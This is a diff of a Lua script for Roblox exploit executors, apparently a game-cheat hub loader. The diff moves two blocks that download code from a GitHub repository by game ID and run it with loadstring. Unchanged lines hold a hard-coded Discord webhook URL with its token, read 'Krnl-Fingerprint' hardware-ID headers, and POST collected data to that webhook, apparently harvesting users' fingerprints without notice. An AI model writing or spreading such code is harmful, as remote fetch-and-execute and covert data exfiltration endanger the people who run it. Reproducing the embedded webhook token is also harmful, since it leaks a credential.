@@ -1,3 +1,16 @@
+pcall(function()
+   if game:HttpGet("https://raw.githubusercontent.com/howyougetcracked/ygGameHub/main/"..game.PlaceId) then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/howyougetcracked/ygGameHub/main/"..game.PlaceId))()
+    end 
+end)
+
+pcall(function()
+if game:HttpGet("https://raw.githubusercontent.com/howyougetcracked/ygGameHub/main/"..game.GameId) then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/howyougetcracked/ygGameHub/main/"..game.GameId))()
+    end
+end)
+
+
 local url = 'https://discord.com/api/webhooks/933933539513237565/hkRHJDBwFFoX_y4LrlTHoCQMJEg3CbZBd4fjTBPihUcoXdlJE8eu2pAVT-j6FCJcsaRn'
 local req = http_request
 local hwid_headers = {'Krnl-Fingerprint'}  -- You will have to add more headers for different exploits
@@ -45,15 +58,3 @@ local data = {
 
 
 local Post = req({Url = url,  Method = 'POST', Headers = { ['Content-Type'] = 'application/json' }, Body = game:GetService('HttpService'):JSONEncode(data)})
-
-pcall(function()
-   if game:HttpGet("https://raw.githubusercontent.com/howyougetcracked/ygGameHub/main/"..game.PlaceId) then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/howyougetcracked/ygGameHub/main/"..game.PlaceId))()
-    end 
-end)
-
-pcall(function()
-if game:HttpGet("https://raw.githubusercontent.com/howyougetcracked/ygGameHub/main/"..game.GameId) then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/howyougetcracked/ygGameHub/main/"..game.GameId))()
-    end
-end)
